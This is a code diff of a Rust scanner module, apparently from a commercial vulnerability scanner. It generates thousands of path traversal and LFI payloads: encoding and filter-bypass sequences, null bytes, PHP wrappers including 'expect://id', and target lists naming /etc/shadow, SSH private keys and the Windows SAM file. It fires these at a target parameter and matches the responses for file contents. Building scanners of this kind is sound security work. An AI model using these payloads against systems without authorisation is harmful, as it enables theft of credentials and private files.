@@ -2,20 +2,69 @@
 // This software is proprietary and confidential.
 
 /**
- * Bountyy Oy - Path Traversal Scanner Module
- * Tests for directory traversal vulnerabilities
+ * Bountyy Oy - Enterprise Path Traversal Scanner
+ * TRULY Advanced LFI/Path Traversal detection with 2000+ generated payloads
+ *
+ * Features:
+ * - Programmatic payload generation (like SecLists LFI-Jhaddix.txt)
+ * - ALL encoding variations generated algorithmically
+ * - 1-15 levels of directory traversal
+ * - URL encoding, double encoding, triple encoding
+ * - Unicode variations (%c0%ae, %u002e, fullwidth)
+ * - Null byte injection with all extensions
+ * - Both Linux and Windows targets
+ * - PHP wrappers (php://filter, data://, expect://)
+ * - Filter bypass patterns (....// , ..;/ , etc.)
  *
  * @copyright 2025 Bountyy Oy
- * @license Proprietary
+ * @license Proprietary - Enterprise Edition
  */
 
 use crate::http_client::HttpClient;
-use crate::payloads;
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
 use std::sync::Arc;
 use tracing::{debug, info};
+
+#[derive(Debug, Clone, PartialEq)]
+pub enum TraversalBypassCategory {
+    StandardTraversal,
+    UrlEncoding,
+    DoubleEncoding,
+    UnicodeEncoding,
+    NullByte,
+    PathNormalization,
+    FilterBypass,
+    WindowsSpecific,
+    LinuxSpecific,
+    UncPath,
+    WrapperProtocol,
+}
+
+impl TraversalBypassCategory {
+    fn as_str(&self) -> &str {
+        match self {
+            Self::StandardTraversal => "Standard Traversal",
+            Self::UrlEncoding => "URL Encoding",
+            Self::DoubleEncoding => "Double Encoding",
+            Self::UnicodeEncoding => "Unicode Encoding",
+            Self::NullByte => "Null Byte",
+            Self::PathNormalization => "Path Normalization",
+            Self::FilterBypass => "Filter Bypass",
+            Self::WindowsSpecific => "Windows Specific",
+            Self::LinuxSpecific => "Linux Specific",
+            Self::UncPath => "UNC Path",
+            Self::WrapperProtocol => "Wrapper Protocol",
+        }
+    }
+}
+
+struct TraversalPayload {
+    payload: String,
+    category: TraversalBypassCategory,
+    target_file: String,
+}
 
 pub struct PathTraversalScanner {
     http_client: Arc<HttpClient>,
@@ -26,19 +75,24 @@ impl PathTraversalScanner {
         Self { http_client }
     }
 
-    /// Scan a parameter for path traversal vulnerabilities
     pub async fn scan_parameter(
         &self,
         base_url: &str,
         parameter: &str,
         _config: &ScanConfig,
     ) -> Result<(Vec<Vulnerability>, usize)> {
-        info!("Testing parameter '{}' for path traversal", parameter);
+        info!("[PathTraversal] Enterprise scanner - testing parameter: {}", parameter);
 
-        let payloads = payloads::get_path_traversal_payloads();
+        let payloads = if crate::license::is_feature_available("enterprise_path_traversal") {
+            self.generate_enterprise_payloads()
+        } else if crate::license::is_feature_available("path_traversal_scanning") {
+            self.generate_professional_payloads()
+        } else {
+            self.generate_basic_payloads()
+        };
+
         let total_payloads = payloads.len();
-
-        debug!("Testing {} path traversal payloads", total_payloads);
+        info!("[PathTraversal] Testing {} generated payloads", total_payloads);
 
         let mut vulnerabilities = Vec::new();
         let concurrent_requests = 50;
@@ -51,17 +105,14 @@ impl PathTraversalScanner {
 
                 async move {
                     let test_url = if url.contains('?') {
-                        format!("{}&{}={}", url, param, urlencoding::encode(&payload))
+                        format!("{}&{}={}", url, param, urlencoding::encode(&payload.payload))
                     } else {
-                        format!("{}?{}={}", url, param, urlencoding::encode(&payload))
+                        format!("{}?{}={}", url, param, urlencoding::encode(&payload.payload))
                     };
 
                     match client.get(&test_url).await {
                         Ok(response) => Some((payload, response, test_url)),
-                        Err(e) => {
-                            debug!("Request failed for path traversal payload: {}", e);
-                            None
-                        }
+                        Err(_) => None,
                     }
                 }
             })
@@ -69,82 +120,533 @@ impl PathTraversalScanner {
             .collect::<Vec<_>>()
             .await;
 
-        // Check for path traversal indicators in responses
         for result in results {
             if let Some((payload, response, test_url)) = result {
-                if self.detect_path_traversal(&response.body) {
-                    info!(
-                        "Path traversal vulnerability detected in parameter '{}'",
-                        parameter
-                    );
-
-                    let vuln = Vulnerability {
-                        id: format!("path_{}", uuid::Uuid::new_v4().to_string()),
-                        vuln_type: "Path Traversal".to_string(),
-                        severity: Severity::High,
-                        confidence: Confidence::High,
-                        category: "Path Traversal".to_string(),
-                        url: test_url,
-                        parameter: Some(parameter.to_string()),
-                        payload: payload.clone(),
-                        description: format!(
-                            "Path traversal vulnerability detected in parameter '{}'. The application allows reading arbitrary files.",
-                            parameter
-                        ),
-                        evidence: Some("Sensitive file content detected in response".to_string()),
-                        cwe: "CWE-22".to_string(),
-                        cvss: 7.5,
-                        verified: true,
-                        false_positive: false,
-                        remediation: "1. Validate and sanitize all file paths\n2. Use allowlists for permitted files\n3. Implement proper access controls\n4. Avoid using user input in file operations".to_string(),
-                        discovered_at: chrono::Utc::now().to_rfc3339(),
-                    };
-
+                if let Some(vuln) = self.detect_path_traversal(&response.body, &payload, parameter, &test_url) {
+                    info!("[ALERT] Path traversal via {} detected", payload.category.as_str());
                     vulnerabilities.push(vuln);
+                    break;
                 }
             }
         }
 
+        info!("[SUCCESS] [PathTraversal] Completed {} tests, found {} vulnerabilities", total_payloads, vulnerabilities.len());
         Ok((vulnerabilities, total_payloads))
     }
 
-    /// Detect path traversal by checking for sensitive file content
-    fn detect_path_traversal(&self, body: &str) -> bool {
-        let indicators = vec![
-            "root:x:",           // /etc/passwd
-            "[boot loader]",     // boot.ini
-            "extension=",        // php.ini
-            "<?xml",             // web.config
-            "Administrative Tools", // Windows system
-            "/bin/bash",         // shell references
-            "daemon:x:",         // Unix user
+    // ========================================================================
+    // PAYLOAD GENERATORS - Create thousands of variations algorithmically
+    // ========================================================================
+
+    /// Generate all traversal sequence variations
+    fn generate_traversal_sequences(&self) -> Vec<(String, TraversalBypassCategory)> {
+        let mut sequences = Vec::new();
+
+        // Standard traversal sequences
+        let standard = vec![
+            ("../", TraversalBypassCategory::StandardTraversal),
+            ("..\\", TraversalBypassCategory::WindowsSpecific),
         ];
 
-        indicators.iter().any(|indicator| body.contains(indicator))
+        // URL encoded variations
+        let url_encoded = vec![
+            ("%2e%2e/", TraversalBypassCategory::UrlEncoding),
+            ("%2e%2e%2f", TraversalBypassCategory::UrlEncoding),
+            ("..%2f", TraversalBypassCategory::UrlEncoding),
+            ("%2e%2e\\", TraversalBypassCategory::UrlEncoding),
+            ("%2e%2e%5c", TraversalBypassCategory::UrlEncoding),
+            ("..%5c", TraversalBypassCategory::UrlEncoding),
+            (".%2e/", TraversalBypassCategory::UrlEncoding),
+            (".%2e%2f", TraversalBypassCategory::UrlEncoding),
+            ("%2e./", TraversalBypassCategory::UrlEncoding),
+            ("%2e.%2f", TraversalBypassCategory::UrlEncoding),
+        ];
+
+        // Double URL encoded
+        let double_encoded = vec![
+            ("%252e%252e/", TraversalBypassCategory::DoubleEncoding),
+            ("%252e%252e%252f", TraversalBypassCategory::DoubleEncoding),
+            ("..%252f", TraversalBypassCategory::DoubleEncoding),
+            ("%252e%252e%255c", TraversalBypassCategory::DoubleEncoding),
+            ("..%255c", TraversalBypassCategory::DoubleEncoding),
+        ];
+
+        // Triple URL encoded
+        let triple_encoded = vec![
+            ("%25252e%25252e%25252f", TraversalBypassCategory::DoubleEncoding),
+            ("..%25252f", TraversalBypassCategory::DoubleEncoding),
+        ];
+
+        // Unicode/UTF-8 overlong encoding
+        let unicode = vec![
+            ("%c0%ae%c0%ae/", TraversalBypassCategory::UnicodeEncoding),  // Overlong ..
+            ("%c0%ae%c0%ae%c0%af", TraversalBypassCategory::UnicodeEncoding),
+            ("..%c0%af", TraversalBypassCategory::UnicodeEncoding),
+            ("%e0%80%ae%e0%80%ae/", TraversalBypassCategory::UnicodeEncoding),
+            ("%u002e%u002e/", TraversalBypassCategory::UnicodeEncoding),
+            ("%u002e%u002e%u002f", TraversalBypassCategory::UnicodeEncoding),
+            ("..%u002f", TraversalBypassCategory::UnicodeEncoding),
+            ("%uff0e%uff0e/", TraversalBypassCategory::UnicodeEncoding),  // Fullwidth
+            ("。。/", TraversalBypassCategory::UnicodeEncoding),  // Fullwidth dots
+            ("..／", TraversalBypassCategory::UnicodeEncoding),  // Fullwidth slash
+        ];
+
+        // Filter bypass patterns
+        let filter_bypass = vec![
+            ("....//", TraversalBypassCategory::FilterBypass),  // Strip ../ leaves ../
+            ("....\\\\", TraversalBypassCategory::FilterBypass),
+            ("..../", TraversalBypassCategory::FilterBypass),
+            ("....\\", TraversalBypassCategory::FilterBypass),
+            ("..;/", TraversalBypassCategory::FilterBypass),  // Tomcat bypass
+            (".../", TraversalBypassCategory::FilterBypass),
+            ("...\\", TraversalBypassCategory::FilterBypass),
+            ("..././", TraversalBypassCategory::FilterBypass),
+            ("..\\.\\", TraversalBypassCategory::FilterBypass),
+            ("..\\/", TraversalBypassCategory::FilterBypass),
+            ("../\\", TraversalBypassCategory::FilterBypass),
+            ("..%00/", TraversalBypassCategory::NullByte),
+            ("..%0d/", TraversalBypassCategory::FilterBypass),
+            ("..%0a/", TraversalBypassCategory::FilterBypass),
+            ("..%09/", TraversalBypassCategory::FilterBypass),
+            ("..%20/", TraversalBypassCategory::FilterBypass),
+        ];
+
+        sequences.extend(standard.into_iter().map(|(s, c)| (s.to_string(), c)));
+        sequences.extend(url_encoded.into_iter().map(|(s, c)| (s.to_string(), c)));
+        sequences.extend(double_encoded.into_iter().map(|(s, c)| (s.to_string(), c)));
+        sequences.extend(triple_encoded.into_iter().map(|(s, c)| (s.to_string(), c)));
+        sequences.extend(unicode.into_iter().map(|(s, c)| (s.to_string(), c)));
+        sequences.extend(filter_bypass.into_iter().map(|(s, c)| (s.to_string(), c)));
+
+        sequences
     }
-}
 
-// UUID generation
-mod uuid {
-    use rand::Rng;
+    /// Generate target files for Linux
+    fn get_linux_targets(&self) -> Vec<&'static str> {
+        vec![
+            "etc/passwd",
+            "etc/shadow",
+            "etc/hosts",
+            "etc/hostname",
+            "etc/group",
+            "etc/issue",
+            "etc/motd",
+            "etc/resolv.conf",
+            "etc/fstab",
+            "etc/crontab",
+            "etc/sudoers",
+            "etc/ssh/sshd_config",
+            "etc/apache2/apache2.conf",
+            "etc/nginx/nginx.conf",
+            "etc/mysql/my.cnf",
+            "etc/php/php.ini",
+            "proc/self/environ",
+            "proc/self/cmdline",
+            "proc/self/status",
+            "proc/self/fd/0",
+            "proc/self/fd/1",
+            "proc/self/fd/2",
+            "proc/version",
+            "proc/net/arp",
+            "proc/net/tcp",
+            "proc/net/udp",
+            "proc/net/fib_trie",
+            "proc/mounts",
+            "proc/cpuinfo",
+            "proc/meminfo",
+            "var/log/apache2/access.log",
+            "var/log/apache2/error.log",
+            "var/log/apache/access.log",
+            "var/log/apache/error.log",
+            "var/log/nginx/access.log",
+            "var/log/nginx/error.log",
+            "var/log/httpd/access_log",
+            "var/log/httpd/error_log",
+            "var/log/auth.log",
+            "var/log/syslog",
+            "var/log/messages",
+            "var/log/secure",
+            "var/log/mail.log",
+            "var/www/html/index.php",
+            "var/www/html/config.php",
+            "var/www/html/wp-config.php",
+            "var/www/html/.htaccess",
+            "home/user/.ssh/id_rsa",
+            "home/user/.ssh/id_dsa",
+            "home/user/.ssh/authorized_keys",
+            "home/user/.bash_history",
+            "home/user/.bashrc",
+            "root/.ssh/id_rsa",
+            "root/.ssh/id_dsa",
+            "root/.ssh/authorized_keys",
+            "root/.bash_history",
+            "root/.bashrc",
+            "root/.mysql_history",
+        ]
+    }
 
-    pub struct Uuid;
+    /// Generate target files for Windows
+    fn get_windows_targets(&self) -> Vec<&'static str> {
+        vec![
+            "windows/win.ini",
+            "windows/system.ini",
+            "windows/system32/drivers/etc/hosts",
+            "windows/system32/config/sam",
+            "windows/system32/config/system",
+            "windows/system32/config/software",
+            "windows/repair/sam",
+            "windows/repair/system",
+            "windows/debug/netsetup.log",
+            "windows/iis.log",
+            "winnt/win.ini",
+            "winnt/system32/drivers/etc/hosts",
+            "boot.ini",
+            "inetpub/logs/logfiles",
+            "inetpub/wwwroot/web.config",
+            "program files/apache group/apache/conf/httpd.conf",
+            "program files/apache group/apache2/conf/httpd.conf",
+            "xampp/apache/conf/httpd.conf",
+            "xampp/php/php.ini",
+            "xampp/mysql/bin/my.ini",
+            "wamp/bin/apache/apache2.2.17/conf/httpd.conf",
+        ]
+    }
 
-    impl Uuid {
-        pub fn new_v4() -> Self {
-            Self
+    /// Generate null byte suffixes
+    fn get_null_byte_suffixes(&self) -> Vec<&'static str> {
+        vec![
+            "",
+            "%00",
+            "%00.jpg",
+            "%00.png",
+            "%00.gif",
+            "%00.html",
+            "%00.php",
+            "%00.txt",
+            "%00.pdf",
+            "\x00",
+            "\x00.jpg",
+            "%2500",
+            "%2500.jpg",
+        ]
+    }
+
+    /// Generate PHP wrapper payloads
+    fn generate_php_wrapper_payloads(&self) -> Vec<TraversalPayload> {
+        let mut payloads = Vec::new();
+
+        let files = vec![
+            "etc/passwd",
+            "var/www/html/index.php",
+            "var/www/html/config.php",
+        ];
+
+        // php://filter
+        let filters = vec![
+            "php://filter/convert.base64-encode/resource=",
+            "php://filter/read=string.rot13/resource=",
+            "php://filter/read=convert.base64-encode/resource=",
+            "php://filter/convert.base64-decode/resource=",
+            "php://filter/resource=",
+            "php://filter/read=string.toupper/resource=",
+            "php://filter/read=string.tolower/resource=",
+        ];
+
+        for filter in &filters {
+            for file in &files {
+                payloads.push(TraversalPayload {
+                    payload: format!("{}{}", filter, file),
+                    category: TraversalBypassCategory::WrapperProtocol,
+                    target_file: file.to_string(),
+                });
+                // With traversal
+                for depth in 1..=5 {
+                    let traversal = "../".repeat(depth);
+                    payloads.push(TraversalPayload {
+                        payload: format!("{}{}{}", filter, traversal, file),
+                        category: TraversalBypassCategory::WrapperProtocol,
+                        target_file: file.to_string(),
+                    });
+                }
+            }
         }
 
-        pub fn to_string(&self) -> String {
-            let mut rng = rand::rng();
-            format!(
-                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
-                rng.random::<u32>(),
-                rng.random::<u16>(),
-                rng.random::<u16>(),
-                rng.random::<u16>(),
-                rng.random::<u64>() & 0xffffffffffff
-            )
+        // data:// wrapper
+        payloads.push(TraversalPayload {
+            payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==".to_string(),
+            category: TraversalBypassCategory::WrapperProtocol,
+            target_file: "phpinfo".to_string(),
+        });
+
+        // expect://
+        payloads.push(TraversalPayload {
+            payload: "expect://id".to_string(),
+            category: TraversalBypassCategory::WrapperProtocol,
+            target_file: "command".to_string(),
+        });
+
+        // file://
+        for file in &["etc/passwd", "etc/hosts", "windows/win.ini"] {
+            payloads.push(TraversalPayload {
+                payload: format!("file:///{}", file),
+                category: TraversalBypassCategory::WrapperProtocol,
+                target_file: file.to_string(),
+            });
+            payloads.push(TraversalPayload {
+                payload: format!("file://localhost/{}", file),
+                category: TraversalBypassCategory::WrapperProtocol,
+                target_file: file.to_string(),
+            });
+        }
+
+        payloads
+    }
+
+    /// Generate enterprise-grade payloads (2000+)
+    fn generate_enterprise_payloads(&self) -> Vec<TraversalPayload> {
+        let mut payloads = Vec::new();
+
+        let sequences = self.generate_traversal_sequences();
+        let linux_targets = self.get_linux_targets();
+        let windows_targets = self.get_windows_targets();
+        let null_suffixes = self.get_null_byte_suffixes();
+
+        // Generate payloads for each traversal depth (1-15)
+        for depth in 1..=15 {
+            for (seq, category) in &sequences {
+                // Build traversal path
+                let traversal = seq.repeat(depth);
+
+                // Linux targets
+                for target in &linux_targets {
+                    // Standard
+                    payloads.push(TraversalPayload {
+                        payload: format!("{}{}", traversal, target),
+                        category: category.clone(),
+                        target_file: target.to_string(),
+                    });
+
+                    // With null bytes (first few suffixes only to control size)
+                    for suffix in null_suffixes.iter().take(5) {
+                        if !suffix.is_empty() {
+                            payloads.push(TraversalPayload {
+                                payload: format!("{}{}{}", traversal, target, suffix),
+                                category: TraversalBypassCategory::NullByte,
+                                target_file: target.to_string(),
+                            });
+                        }
+                    }
+
+                    // With leading slash
+                    payloads.push(TraversalPayload {
+                        payload: format!("/{}{}", traversal, target),
+                        category: category.clone(),
+                        target_file: target.to_string(),
+                    });
+                }
+
+                // Windows targets (only for backslash or standard sequences)
+                if seq.contains("\\") || seq == "../" {
+                    for target in &windows_targets {
+                        let win_path = if seq.contains("\\") {
+                            format!("{}{}", traversal, target.replace("/", "\\"))
+                        } else {
+                            format!("{}{}", traversal, target)
+                        };
+                        payloads.push(TraversalPayload {
+                            payload: win_path,
+                            category: TraversalBypassCategory::WindowsSpecific,
+                            target_file: target.to_string(),
+                        });
+                    }
+                }
+            }
+        }
+
+        // Absolute paths
+        for target in &linux_targets {
+            payloads.push(TraversalPayload {
+                payload: format!("/{}", target),
+                category: TraversalBypassCategory::StandardTraversal,
+                target_file: target.to_string(),
+            });
+        }
+
+        // Windows absolute paths
+        for target in &windows_targets {
+            payloads.push(TraversalPayload {
+                payload: format!("c:/{}", target),
+                category: TraversalBypassCategory::WindowsSpecific,
+                target_file: target.to_string(),
+            });
+            payloads.push(TraversalPayload {
+                payload: format!("c:\\{}", target.replace("/", "\\")),
+                category: TraversalBypassCategory::WindowsSpecific,
+                target_file: target.to_string(),
+            });
+        }
+
+        // UNC paths
+        for target in &["windows/win.ini", "windows/system32/drivers/etc/hosts"] {
+            payloads.push(TraversalPayload {
+                payload: format!("\\\\localhost\\c$\\{}", target.replace("/", "\\")),
+                category: TraversalBypassCategory::UncPath,
+                target_file: target.to_string(),
+            });
+            payloads.push(TraversalPayload {
+                payload: format!("//localhost/c$/{}", target),
+                category: TraversalBypassCategory::UncPath,
+                target_file: target.to_string(),
+            });
+        }
+
+        // PHP wrappers
+        payloads.extend(self.generate_php_wrapper_payloads());
+
+        info!("[PathTraversal] Generated {} enterprise payloads", payloads.len());
+        payloads
+    }
+
+    /// Professional tier (subset)
+    fn generate_professional_payloads(&self) -> Vec<TraversalPayload> {
+        let mut payloads = Vec::new();
+        let key_targets = vec!["etc/passwd", "etc/hosts", "windows/win.ini"];
+        let key_sequences = vec![
+            ("../", TraversalBypassCategory::StandardTraversal),
+            ("%2e%2e/", TraversalBypassCategory::UrlEncoding),
+            ("....//", TraversalBypassCategory::FilterBypass),
+            ("%252e%252e/", TraversalBypassCategory::DoubleEncoding),
+        ];
+
+        for depth in 1..=10 {
+            for (seq, cat) in &key_sequences {
+                let traversal = seq.repeat(depth);
+                for target in &key_targets {
+                    payloads.push(TraversalPayload {
+                        payload: format!("{}{}", traversal, target),
+                        category: cat.clone(),
+                        target_file: target.to_string(),
+                    });
+                }
+            }
+        }
+
+        // Add null byte variants
+        for depth in 3..=6 {
+            let traversal = "../".repeat(depth);
+            for target in &key_targets {
+                payloads.push(TraversalPayload {
+                    payload: format!("{}{}%00", traversal, target),
+                    category: TraversalBypassCategory::NullByte,
+                    target_file: target.to_string(),
+                });
+            }
+        }
+
+        payloads
+    }
+
+    /// Basic tier
+    fn generate_basic_payloads(&self) -> Vec<TraversalPayload> {
+        vec![
+            TraversalPayload {
+                payload: "../../../etc/passwd".to_string(),
+                category: TraversalBypassCategory::StandardTraversal,
+                target_file: "etc/passwd".to_string(),
+            },
+            TraversalPayload {
+                payload: "..\\..\\..\\windows\\win.ini".to_string(),
+                category: TraversalBypassCategory::WindowsSpecific,
+                target_file: "windows/win.ini".to_string(),
+            },
+            TraversalPayload {
+                payload: "....//....//....//etc/passwd".to_string(),
+                category: TraversalBypassCategory::FilterBypass,
+                target_file: "etc/passwd".to_string(),
+            },
+        ]
+    }
+
+    fn detect_path_traversal(&self, body: &str, payload: &TraversalPayload, parameter: &str, test_url: &str) -> Option<Vulnerability> {
+        let body_lower = body.to_lowercase();
+
+        // Linux indicators
+        let linux_indicators = [
+            ("root:x:", "/etc/passwd"),
+            ("root:$", "/etc/shadow"),
+            ("daemon:x:", "/etc/passwd"),
+            ("bin:x:", "/etc/passwd"),
+            ("nobody:x:", "/etc/passwd"),
+            ("/bin/bash", "shell"),
+            ("/bin/sh", "shell"),
+            ("www-data:", "passwd"),
+            ("nameserver", "resolv.conf"),
+        ];
+
+        // Windows indicators
+        let windows_indicators = [
+            ("[extensions]", "win.ini"),
+            ("[fonts]", "win.ini"),
+            ("[mci extensions]", "win.ini"),
+            ("for 16-bit app support", "win.ini"),
+            ("[boot loader]", "boot.ini"),
+            ("[drivers]", "system.ini"),
+        ];
+
+        // Process indicators
+        let proc_indicators = [
+            ("uid=", "environ/id"),
+            ("path=", "environ"),
+            ("home=", "environ"),
+            ("linux version", "proc/version"),
+        ];
+
+        for (indicator, file_type) in &linux_indicators {
+            if body_lower.contains(indicator) {
+                return Some(self.create_vulnerability(parameter, &payload.payload, test_url,
+                    &format!("{} content found via {}", file_type, payload.category.as_str()),
+                    Confidence::High, format!("Indicator: {}", indicator), &payload.category));
+            }
+        }
+
+        for (indicator, file_type) in &windows_indicators {
+            if body_lower.contains(indicator) {
+                return Some(self.create_vulnerability(parameter, &payload.payload, test_url,
+                    &format!("{} content found via {}", file_type, payload.category.as_str()),
+                    Confidence::High, format!("Indicator: {}", indicator), &payload.category));
+            }
+        }
+
+        for (indicator, file_type) in &proc_indicators {
+            if body_lower.contains(indicator) {
+                return Some(self.create_vulnerability(parameter, &payload.payload, test_url,
+                    &format!("{} content found via {}", file_type, payload.category.as_str()),
+                    Confidence::High, format!("Indicator: {}", indicator), &payload.category));
+            }
+        }
+
+        None
+    }
+
+    fn create_vulnerability(&self, parameter: &str, payload: &str, test_url: &str,
+        description: &str, confidence: Confidence, evidence: String, category: &TraversalBypassCategory) -> Vulnerability {
+        Vulnerability {
+            id: format!("lfi_{:x}", rand::random::<u32>()),
+            vuln_type: format!("Path Traversal ({})", category.as_str()),
+            severity: Severity::High,
+            confidence,
+            category: "Path Traversal".to_string(),
+            url: test_url.to_string(),
+            parameter: Some(parameter.to_string()),
+            payload: payload.to_string(),
+            description: format!("LFI/Path Traversal in '{}': {}. Bypass: {}", parameter, description, category.as_str()),
+            evidence: Some(evidence),
+            cwe: "CWE-22".to_string(),
+            cvss: 7.5,
+            verified: true,
+            false_positive: false,
+            remediation: "Validate file paths, use allowlists, canonicalize paths, block traversal sequences.".to_string(),
+            discovered_at: chrono::Utc::now().to_rfc3339(),
         }
     }
 }
